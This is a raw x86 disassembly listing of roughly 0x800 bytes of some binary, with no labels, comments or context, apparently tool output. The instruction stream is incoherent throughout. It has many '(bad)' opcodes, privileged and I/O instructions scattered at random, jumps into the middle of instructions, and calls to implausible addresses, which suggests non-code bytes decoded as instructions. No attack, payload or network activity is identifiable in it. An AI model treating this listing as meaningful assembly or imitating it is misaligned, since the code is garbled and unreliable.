  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
